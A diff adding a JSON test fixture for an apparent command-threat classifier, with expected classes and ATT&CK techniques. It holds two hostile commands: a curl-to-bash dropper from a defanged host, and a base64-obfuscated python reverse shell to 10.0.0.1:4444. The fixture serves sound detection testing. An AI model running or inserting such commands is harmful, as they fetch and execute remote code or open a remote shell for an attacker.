@@ -1,0 +1,24 @@
+[
+  {
+    "id": "curl-pipe-bash",
+    "description": "Remote script download piped directly into bash — classic Linux dropper",
+    "command": "curl -fsSL hxxps://cdn.packages-update[.]xyz/install.sh | bash -s -- --no-verify",
+    "expect": {
+      "classes": ["dropper"],
+      "min_confidence": {"dropper": "high"},
+      "techniques": ["T1059.004", "T1105"]
+    },
+    "reject": {"classes": ["impact", "credential_theft"]}
+  },
+  {
+    "id": "python3-b64-reverse-shell",
+    "description": "python3 -c exec() of base64-encoded socket reverse shell",
+    "command": "python3 -c \"import base64,subprocess;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzEwLjAuMC4xJyw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7').decode())\"",
+    "expect": {
+      "classes": ["loader"],
+      "min_confidence": {"loader": "medium"},
+      "techniques": ["T1059.006"]
+    },
+    "reject": {"classes": ["impact"]}
+  }
+]
